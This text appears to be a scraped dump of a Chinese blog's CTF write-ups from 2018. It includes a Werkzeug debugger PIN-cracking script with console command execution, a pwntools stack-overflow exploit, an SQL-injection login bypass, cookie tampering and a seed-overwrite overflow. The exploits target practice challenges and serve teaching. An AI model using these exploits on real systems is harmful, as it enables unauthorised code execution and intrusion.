pin安全问题参考:https://xz.aliyun.com/t/2553http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/#webhttps://www.smi1e.top/%e5%ae%89%e6%81%92%e6%9d%af%e6%9c%88%e8%b5%9bwrite-up/https://www.jianshu.com/p/e4cfa55a401a打开网站![](https://i.loli.net/2018/11/11/5be7b324372ec.png)点击注册![](https://i.loli.net/2018/11/11/5be7b3240ed12.png)写着什么图床系统，很奇怪,注册之后更奇怪![OperationalError database is locked Werkzeug Debugger.png](https://i.loli.net/2018/11/11/5be7b3243eefa.png)根据先知那位师傅的解释，主要就是利用Flask在debug模式下会生成一个Debugger PIN,我们就是要获取pin码，才可以进行任意的代码执行，来获取flag参考飘零师傅的脚本```pythonimport hashlibfrom itertools import chainprobably_public_bits = [ &apos;ctf&apos;,# username &apos;flask.app&apos;,# modname &apos;Flask&apos;,# getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)) &apos;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&apos; # getattr(mod, &apos;__file__&apos;, None),]private_bits = [ &apos;2485377892354&apos;# str(uuid.getnode()), /sys/class/net/eth0/address]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&apos;utf-8&apos;) h.update(bit)h.update(b&apos;cookiesalt&apos;)cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&apos;pinsalt&apos;) num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 运行之后得到pin:131-442-946 点击右边那个小终端 输入刚才的pin 然后就可以执行命令 输入以下命令 1234567[console ready]&gt;&gt;&gt; from subprocess import check_output&gt;&gt;&gt; check_output('ls',shell=True)'app\\nbin\\nboot\\ndev\\netc\\nfff111aaggggg___hhh\\nhome\\nlib\\nlib64\\nmedia\\nmnt\\nopt\\n &gt;&gt;&gt; os.popen('cat fff111aaggggg___hhh').read()'flag&#123;87052362d59339071c5ce607ad28b752&#125;\\n'&gt;&gt;&gt; ## 暴力可解 盲水印攻击首先爆破压缩包密码23092019 python bwm.py decode 1.png 2.png flag.png","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"pwn之路_ret2text","slug":"pwn之路_ret2text","date":"2018-11-11T05:32:13.000Z","updated":"2018-11-11T10:16:43.797Z","comments":true,"path":"2018/11/11/pwn之路_ret2text/","link":"","permalink":"https://threst.github.io/2018/11/11/pwn之路_ret2text/","excerpt":"","text":"ret2text题目地址:https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text 源码12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;void secure(void)&#123; int secretcode, input; srand(time(NULL)); secretcode = rand(); scanf(\"%d\", &amp;input); if(input == secretcode) system(\"/bin/sh\");&#125;int main(void)&#123; setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); char buf[100]; printf(\"There is something amazing here, do you know anything?\\n\"); gets(buf); printf(\"Maybe I will tell you next time !\"); return 0;&#125; 问题还是出现在gets函数上，可以无限读取用户的输入，只要我们输的足够长，就可以覆盖secure的返回地址，来执行系统操作了,流程理解，首先就是要知道输入多少才可以栈溢出 寻找什么时候溢出我们使用cyclic命令来随机生成２００个’随机’的字符 └──╼ $cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 使用gdb来调试下12345678910111213141516171819202122232425262728293031323334353637383940414243pwndbg&gt; runStarting program: /home/threst/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text There is something amazing here, do you know anything?aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabMaybe I will tell you next time !Program received signal SIGSEGV, Segmentation fault.0x62616164 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────── EAX 0x0 EBX 0x0 ECX 0x21 EDX 0xf7f9a890 (_IO_stdfile_1_lock) ◂— 0x0 EDI 0x0 ESI 0xf7f99000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0x62616163 ('caab') ESP 0xffffd1a0 ◂— 0x62616165 ('eaab') EIP 0x62616164 ('daab')────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────Invalid address 0x62616164pwndbg&gt; runStarting program: /home/threst/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text There is something amazing here, do you know anything?aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabMaybe I will tell you next time !Program received signal SIGSEGV, Segmentation fault.0x62616164 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────── EAX 0x0 EBX 0x0 ECX 0x21 EDX 0xf7f9a890 (_IO_stdfile_1_lock) ◂— 0x0 EDI 0x0 ESI 0xf7f99000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0x62616163 ('caab') ESP 0xffffd1a0 ◂— 0x62616165 ('eaab') EIP 0x62616164 ('daab')────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────Invalid address 0x62616164 我们可以看见在Invalid address 0x62616164的位置上栈溢出了,然后在使用下面的命令 └──╼ $cyclic -l 0x62616164112 可以看见在112的字符后面栈溢出了 寻找要覆盖的地址通过objdump发现system函数 1234567891011121314151617181920└──╼ $objdump -R ret2textret2text: file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__0804a040 R_386_COPY stdin@@GLIBC_2.00804a060 R_386_COPY stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT printf@GLIBC_2.00804a010 R_386_JUMP_SLOT gets@GLIBC_2.00804a014 R_386_JUMP_SLOT time@GLIBC_2.00804a018 R_386_JUMP_SLOT puts@GLIBC_2.00804a01c R_386_JUMP_SLOT system@GLIBC_2.00804a020 R_386_JUMP_SLOT __gmon_start__0804a024 R_386_JUMP_SLOT srand@GLIBC_2.00804a028 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.00804a02c R_386_JUMP_SLOT setvbuf@GLIBC_2.00804a030 R_386_JUMP_SLOT rand@GLIBC_2.00804a034 R_386_JUMP_SLOT __isoc99_scanf@GLIBC_2.7 ida中找返回地址 写脚本1234567from pwn import *sh = process('./ret2text')target = 0x0804863Ash.sendline('A'*112+p32(target))sh.interactive() 学习到的坑:1.当输入的长度没有到栈溢出的位置的时候，程序直接可以正常退出，没有出现寄存器和栈图 栈溢出的结果 2.在ida中找返回地址 一定要找前缀为.text的位置","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://threst.github.io/tags/pwn/"}]},{"title":"hackover18","slug":"hackover18","date":"2018-11-08T05:32:13.000Z","updated":"2018-12-31T13:29:18.283Z","comments":true,"path":"2018/11/08/hackover18/","link":"","permalink":"https://threst.github.io/2018/11/08/hackover18/","excerpt":"","text":"文章首发先知 I AM MANY直接foremost分离即可 flag:hackover18{different_Fl4g_for_3arly_ch33tahz} ez web Easy web challenge in the slimmest possible design…. namely none.http://ez-web.ctf.hackover.de:8080 发现有robots.txt文件，提示/flag/,进入文件夹,有个falg.txt,点击提示 You do not have permission to enter this Area. A mail has been sent to our Admins.You shall be arrested shortly. 抓包修改Cookie: isAllowed=true flag:hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n} i-love-heddha A continuation of the Ez-Web challenge. enjoy207.154.226.40:8080 是刚才那个的升级版,一样的找到/flag/flag.txt,设置isAllowed， 可是然后提示ou are using the wrong browser, &#39;Builder browser 1.0.1&#39; is required You are refered from the wrong location hackover.18 would be the correct place to come fro 修改UA,referer,得到flag:hackover18{4ngryW3bS3rv3rS4ysN0} who knows john dows? Howdy mate! Just login and hand out the flag, aye! You can find on h18johndoe has all you need! 打开网站直接是要你输入用户名或邮箱 随便输一个，发现不对,根据提示h18johndoe,去github上面试试，果然搜到一个用户 github:https://github.com/h18johndoe 把这个仓库下下来git clone https://github.com/h18johndoe/user_repository.git 发现很多邮箱，一个一个去试试,尝试之后只有`john_doe@notes.h18`可以登录 登录之后提示输入密码，尝试万能密码&#39; OR 1=1 --:,成功！！ flag:hackover18{I_KN0W_H4W_70_STALK_2018} secure-hash We advise you to replace uses of unordered_hash with our new SecureHashtable class, since we added advanced crypto to make it 14.3 times more secure.Update: the binary was compiled with g++ and libstdc++, 64bitWe’re running a demo version, try it now:nc secure-hash.ctf.hackover.de 1337 源代码如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;openssl/evp.h&gt;#include &lt;unordered_set&gt;#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;unistd.h&gt;// TODO - Make an #ifdef to detect openssl/libressl.//#define EVP_CREATE_FN() EVP_MD_CTX_new()//#define EVP_DESTROY_FN(x) EVP_MD_CTX_free(x)#define EVP_CREATE_FN() EVP_MD_CTX_create()#define EVP_DESTROY_FN(x) EVP_MD_CTX_cleanup(x)enum auth_result &#123; AUTH_FAILURE, AUTH_SUCCESS, AUTH_TIMEOUT,&#125;;class SecureHashtable &#123;private: const int MAX_SIZE = 15000; std::unordered_set&lt;std::string&gt; values; std::string sha512sum(const std::string&amp; name, const std::string&amp; password) &#123; EVP_MD_CTX *mdctx; const EVP_MD *md; unsigned char md_value[EVP_MAX_MD_SIZE]; unsigned int md_len; mdctx = EVP_CREATE_FN(); md = EVP_get_digestbyname(\"sha512\"); EVP_MD_CTX_init(mdctx); EVP_DigestInit_ex(mdctx, md, NULL); EVP_DigestUpdate(mdctx, name.c_str(), name.size()); EVP_DigestUpdate(mdctx, password.c_str(), password.size()); EVP_DigestFinal_ex(mdctx, md_value, &amp;md_len); EVP_DESTROY_FN(mdctx); return std::string(reinterpret_cast&lt;char*&gt;(md_value), md_len); &#125;public: SecureHashtable() &#123; values.reserve(MAX_SIZE); &#125; bool insert_keyvalue(const std::string&amp; name, const std::string&amp; password) &#123; if (values.size() &gt;= MAX_SIZE) return false; // Size limit exceeded. std::string digest = sha512sum(name, password); values.insert(digest); return true; &#125; auth_result lookup_keyvalue(const std::string&amp; name, const std::string&amp; password) &#123; std::string digest = sha512sum(name, password); size_t bucket = values.bucket(digest); auto it = values.begin(bucket), end = values.end(bucket); size_t iterations = 0; size_t MAX_ITERATIONS = 1000; while (it != end) &#123; if (*it++ == digest) return AUTH_SUCCESS; // Avoid DoS attacks by fixing upper time limit. if (iterations++ &gt;= MAX_ITERATIONS) return AUTH_TIMEOUT; &#125; return AUTH_FAILURE; &#125;&#125;;int main() &#123; OpenSSL_add_all_digests(); std::ifstream ifs(\"./flag.txt\"); std::string flag; ifs &gt;&gt; flag; SecureHashtable table; table.insert_keyvalue(\"root\", flag); while (true) &#123; usleep(1000); int choice; std::string name, password; printf(\"Main menu:\\n1 - Register new user\\n2 - Login\\n\"); std::cin &gt;&gt; choice; printf(\"Name: \"); std::cin &gt;&gt; name; printf(\"Password: \"); std::cin &gt;&gt; password; if (choice == 1) &#123; if (name == \"root\") &#123; printf(\"You are not root!\\n\"); continue; &#125; table.insert_keyvalue(name, password); &#125; else if (choice == 2) &#123; if (table.lookup_keyvalue(name, password)) &#123; printf(\"Success! Logged in as %s\\n\", name.c_str()); if (name == \"root\") &#123; printf(\"You win, the flag is %s\\n\", flag.c_str()); return 0; &#125; &#125; else &#123; printf(\"Invalid credentials!\\n\"); &#125; &#125; else &#123; printf(\"Invalid choice!\\n\"); &#125; &#125;&#125; 分析一下流程，首先要用户注册，可是不能注册root用户，但是在登录的时候要以root身份登录才可以获取flag EVP_MD_CTX_init该函数初始化一个EVP_MD_CTX结构 EVP_DigestInit_ex该函数使用參数impl所指向的ENGINE设置该信息摘要结构体，參数ctx在调用本函数之前必须经过初始化。參数type通常是使用象EVP_sha1这种函数的返回值。假设impl为NULL。那么就会使用缺省实现的信息摘要函数。大多数应用程序里面impl是设置为NULL的。操作成功返回1，否则返回0。 EVP_DigestUpdate该函数将參数d中的cnt字节数据进行信息摘要到ctx结构中去。该函数能够被调用多次。用以对很多其它的数据进行信息摘要。操作成功返回1，否则返回0。 EVP_DigestFinal_ex本函数将ctx结构中的摘要信息数据返回到參数md中，假设參数s不是NULL，那么摘要数据的长度（字节）就会被写入到參数s中，大多数情况下，写入的值是EVP_MAX_MD_SIZE。在调用本函数后。不能使用同样的ctx结构调用EVP_DigestUpdate再进行数据的信息摘要操作,可是假设调用EVP_DigestInit_ex函数又一次初始化后能够进行新的信息摘要操作。操作成功返回1，否则返回0。 特别注意，名称和密码一个接一个地添加到摘要中，并且使用std :: string :: size确定添加的字节数，它返回字符串的实际字节数，不包括null 字节。使用例如name ==“fo”和password =“obar”可以实现相同的结果，因此这两组凭证将导致相同的摘要，因此std :: unordered_set中的桶相同。现在我们来试试。我们注册名称为==“ro”且密码==“ot1”的用户，然后只需尝试登录名称==“root”和密码==“1” flag:hackover18{00ps_y0u_mu5t_h4ve_h1t_a_v3ry_unlikely_5peci4l_c4s3} Hummel Hummel There is no “hackover18{*}” in the word. the solution has to be inserted as hackover18{mysolution}. 下载下来一个mp4的文件，播放看见一个马在打屁，可是很有节奏，用audacity查看，发现 看起来像是莫斯密码,上下相连的为.,其他为-,全部连起来就是这样 .--. --- . - .-. -.-- / .. -. ... .--. .. .-. . -.. / -... -.-- / -... .- -.- . -.. / -... . .- -. ..... flag:hackover18{poetry inspired by baked beans} UnbreakMyStart题目是xz文件，但是看起来好像损坏了 1234567891011121314$ xxd unbreak_my_start.tar.xz0000000: 504b 0304 1400 0800 0800 04e6 d6b4 4602 PK............F.0000010: 0021 0116 0000 0074 2fe5 a3e0 07ff 007d .!.....t/......&#125;0000020: 5d00 331b 0847 5472 2320 a8d7 45d4 9ae8 ].3..GTr# ..E...0000030: 3a57 139f 493f c634 8905 8c4f 0bc6 3b67 :W..I?.4...O..;g0000040: 7028 1a35 f195 abb0 2e26 666d 8c92 da43 p(.5.....&amp;fm...C0000050: 11e1 10ac 4496 e2ed 36cf 9c99 afe6 5a8e ....D...6.....Z.0000060: 311e cb99 f4be 6dca 943c 4410 8873 428a 1.....m..&lt;D..sB.0000070: 7c17 f47a d17d 7808 b7e4 22b8 ec19 9275 |..z.&#125;x...&quot;....u0000080: 5073 0c34 5f9e 14ac 1986 d378 7b79 9f87 Ps.4_......x&#123;y..0000090: 0623 7369 4372 19da 6e33 0217 7f8d 0000 .#siCr..n3......00000a0: 0000 001c 0f1d febd b436 8c00 0199 0180 .........6......00000b0: 1000 00ad af23 35b1 c467 fb02 0000 0000 .....#5..g......00000c0: 0459 5a .YZ 这个PK是zip文件常见的,参考这个xz文件格式https://tukaani.org/xz/xz-file-format-1.0.4.txt 我们尝试用我们构造的头替换文件的前11个字节 12345678$ dd if=unbreak_my_start.tar.xz of=trimmed.bin bs=1 skip=11184+0 records in184+0 records out184 bytes transferred in 0.000920 secs (199988 bytes/sec)$ (printf &quot;\\xFD7zXZ\\x00\\x00\\x04&quot;; cat trimmed.bin) &gt; fixed.tar.xz$ xz -d fixed.tar.xz$ cat fixed.tar flag.txt000644 001750 001750 00000000045 13340067500 013221 0ustar00heddhaheddha000000 000000 hackover18&#123;U_f0und_th3_B3st_V3rs10n&#125; 得到flag flag:hackover18{U_f0und_th3_B3st_V3rs10n}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"D-CTFQuals2018","slug":"D-CTFQuals2018","date":"2018-11-02T05:32:13.000Z","updated":"2018-11-11T10:13:44.944Z","comments":true,"path":"2018/11/02/D-CTFQuals2018/","link":"","permalink":"https://threst.github.io/2018/11/02/D-CTFQuals2018/","excerpt":"","text":"XORnigma12345678910import itertoolsdef xor_two_str(s, key): key = key * (len(s) / len(key) + 1) return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in itertools.izip(s, key)) flag = \"\" flag_key = \"\"x = xor_two_str(flag, flag_key)print x.encode(\"hex\")# 000000003f2537257777312725266c24207062777027307574706672217a67747374642577263077777a3725762067747173377326716371272165722122677522746327743e 查下关于itertools库 izipizip用于将多个可迭代对象对应位置的元素作为一个元组，将所有元组『组成』一个迭代器，并返回。它的使用形式如下： izip(iter1, iter2, ..., iterN) 如果某个可迭代对象不再生成值，则迭代停止。 12345678910111213&gt;&gt;&gt; from itertools import izip&gt;&gt;&gt; &gt;&gt;&gt; for item in izip(&apos;ABCD&apos;, &apos;xy&apos;):... print item...(&apos;A&apos;, &apos;x&apos;)(&apos;B&apos;, &apos;y&apos;)&gt;&gt;&gt; for item in izip([1, 2, 3], [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;]):... print item...(1, &apos;a&apos;)(2, &apos;b&apos;)(3, &apos;c&apos;) 根据这个比赛的规则flag前面都有DCTF这个关键字，再结合前面输出00000000，可以判断这个flag_key就是DCTF，因为一样的异或下就为0了，那么接下来的问题就是猜出其他数字了，根据key * (len(s) / len(key) + 1)可以知道他会一直循环key来加密字符串,00000000之后是3f,我们先将3f转为数字 int(&#39;3f&#39;,16) 输出63,在与D进行异或运算 63 ^ ord(&#39;D&#39;)输出123 那么这个123就是密文的ascii码了, chr(123) 输出{ 12345678enc = '000000003f2537257777312725266c24207062777027307574706672217a67747374642577263077777a3725762067747173377326716371272165722122677522746327743e'key = 'DCTF'flag = ''for i in range(len(enc.decode('hex'))): flag += chr(ord(enc.decode('hex')[i])^ord(key[i%len(key)]))print flag DCTF{fcc34eaae8bd3614dd30324e932770c3ed139cc2c3250c5b277cb14ea33f77a0} Ransomware下载来2个文件ransomware.pyc和 youfool!.exe，还原pyc代码 123456789101112131415161718import stringfrom random import *import itertoolsdef caesar_cipher(buf, password): password = password * (len(buf) / len(password) + 1) return ('').join((chr(ord(x) ^ ord(y)) for x, y in itertools.izip(buf, password)))f = open('./FlagDCTF.pdf', 'r')buf = f.read()f.close()allchar = string.ascii_letters + string.punctuation + string.digitspassword = ('').join((choice(allchar) for _ in range(60)))buf = caesar_cipher(buf, password)f = open('./youfool!.exe', 'w')buf = f.write(buf)f.close() 大概意思就是将FlagDCTF.pdf文件与随机60个字符异或加密，输出到youfool!.exe文件中去,那么我们只要找到密码就行了,使用这个工具猜出大概密码 :P-@u\u001aL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4n\u0002[hGd/EeX+¼7,2O&quot;+:[w pdf文件头%PDF-1.,文件尾\\n%%EOF\\n 在使用这个工具,选取他的From hex和XOR模块, 使用xxd -ps youfool\\!.exe 将文件十六进制输出 由于刚才猜出的密码并不是每个字符都是正确的，所以根据output的关键字修改密码，最后得出密码为:P-@uSL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4nP[hGd/EeX+E7,2O&quot;+:[2,得到原始文件，上面就是flag DCTF{d915b5e076215c3efb92e5844ac20d0620d19b15d427e207fae6a3b894f91333} How lucky are you?(pwn) Target: 167.99.143.206 65031Bin: https://dctf.def.camp/dctf-18-quals-81249812/lucky 大致功能你输入名字，然后要你猜１００个随机数字，重点是输入名字这里，可以控制从而溢出. ida反编译代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax@1 unsigned int *v4; // rsi@2 __int64 v5; // rax@4 __int64 v6; // rax@6 __int64 v7; // rax@7 __int64 v8; // rax@7 __int64 v9; // rax@7 const char *v10; // rax@7 __int64 v11; // rax@7 __int64 v12; // rax@7 __int64 v13; // rax@7 __int64 v14; // rax@7 __int64 v15; // rax@7 __int64 v16; // rax@9 __int64 v17; // rax@9 __int64 v18; // rax@9 __int64 v19; // rax@10 __int64 v20; // rax@10 __int64 v21; // rax@11 signed int v22; // ebx@11 __int64 v23; // rax@13 char v25; // [sp+0h] [bp-540h]@12 char v26; // [sp+210h] [bp-330h]@12 char v27; // [sp+240h] [bp-300h]@7 char dest; // [sp+260h] [bp-2E0h]@7 char v29; // [sp+2D0h] [bp-270h]@7 char v30; // [sp+2F0h] [bp-250h]@1 __int64 v31; // [sp+3F0h] [bp-150h]@1 unsigned int seed[2]; // [sp+4F8h] [bp-48h]@1 int v33; // [sp+514h] [bp-2Ch]@9 int v34; // [sp+518h] [bp-28h]@9 unsigned int v35; // [sp+51Ch] [bp-24h]@7 __int64 v36; // [sp+520h] [bp-20h]@1 unsigned int i; // [sp+52Ch] [bp-14h]@7 *(_QWORD *)seed = 0LL; v36 = 8LL; v3 = sub_1972(8LL, 4LL, a3); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::basic_ifstream(&amp;v30, \"/dev/urandom\", (unsigned int)v3); if ( (unsigned __int8)std::basic_ios&lt;char,std::char_traits&lt;char&gt;&gt;::operator bool(&amp;v31) ) &#123; v4 = seed; std::istream::read((std::istream *)&amp;v30, (char *)seed, v36); if ( (unsigned __int8)std::basic_ios&lt;char,std::char_traits&lt;char&gt;&gt;::operator bool(&amp;v31) ) &#123; srand(seed[0]); &#125; else &#123; LODWORD(v5) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cerr, \"Failed to read from /dev/urandom\"); v4 = (unsigned int *)&amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;; std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); &#125; std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::close(&amp;v30, v4); &#125; else &#123; LODWORD(v6) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cerr, \"Failed to open /dev/urandom\"); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); &#125; v35 = rand(); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v29); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v27); LODWORD(v7) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Hello, there!\"); LODWORD(v8) = std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); LODWORD(v9) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What is your name?\"); std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v27); LODWORD(v10) = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::c_str(&amp;v27); strcpy(&amp;dest, v10); srand(v35); LODWORD(v11) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"I am glad to know you, \"); LODWORD(v12) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v11, &amp;dest); LODWORD(v13) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v12, \"!\"); std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); LODWORD(v14) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( &amp;std::cout, \"If you guess the next 100 random numbers I shall give you the flag!\"); LODWORD(v15) = std::ostream::operator&lt;&lt;(v14, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); for ( i = 0; (signed int)i &lt;= 99; ++i ) &#123; v34 = rand(); LODWORD(v16) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What number am I thinking of? [\"); LODWORD(v17) = std::ostream::operator&lt;&lt;(v16, i); LODWORD(v18) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v17, \"/100]\"); std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v27); v33 = sub_1928(&amp;v27, 0LL, 10LL); if ( v33 != v34 ) &#123; LODWORD(v21) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Wow that is wrong!\"); std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v22 = -1; goto LABEL_15; &#125; LODWORD(v19) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Wow that is corect!\"); LODWORD(v20) = std::ostream::operator&lt;&lt;(v19, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); &#125; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v26); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::basic_ifstream(&amp;v25, \"./flag\", 8LL); if ( (unsigned __int8)std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::is_open(&amp;v25) ) &#123; std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v25, &amp;v26); LODWORD(v23) = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cout, &amp;v26); std::ostream::operator&lt;&lt;(v23, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::close(&amp;v25, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); &#125; v22 = 0; std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::~basic_ifstream(&amp;v25); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v26);LABEL_15: std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v27); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v29); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::~basic_ifstream(&amp;v30); return (unsigned int)v22;&#125; 它首先从/dev/urandom读取种子值并生成随机数。它将此随机数存储在v35中。之后，它使用std :: getline（std :: cin，＆v27）读取用户输入。由于它是一个std :: string，它首先调用c_str（）函数来获取C字符串指针并将该指针存储在v10中。最后，它调用strcpy（＆dest，v10）将我们的字符串复制到dest。好处是在这些操作期间没有长度检查，这意味着我们可以使用缓冲区溢出覆盖其他变量。 让我们继续我们的分析。 在读取输入并将其复制到dest后， 它会调用srand（v35）。因此，第一个随机生成的数字实际上是进一步使用的种子值。最后，它使用rand（）生成100个随机数，并期望我们正确猜测它们。 我们可以看到，从dest到v35的距离是700字节，这意味着在700个字符之后，接下来的4个字符将覆盖作为种子的v35中的值。由于我们可以根据需要设置种子值，因此我们可以猜测将生成的数字。(我们输入的是dest将覆盖v35) 既然我们可以控制种子，我们来试试将种子设置为AAAA, 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;int seed = 0x41414141;#AAAAsrand(seed);for (int i = 0; i &lt; 100; i++) &#123; printf(\"%d \", rand());&#125;printf(\"\\n\");return 0;&#125; 知识点:123&gt;&gt;&gt; import pwn&gt;&gt;&gt; pwn.p32(0x41414141)&apos;AAAA&apos; 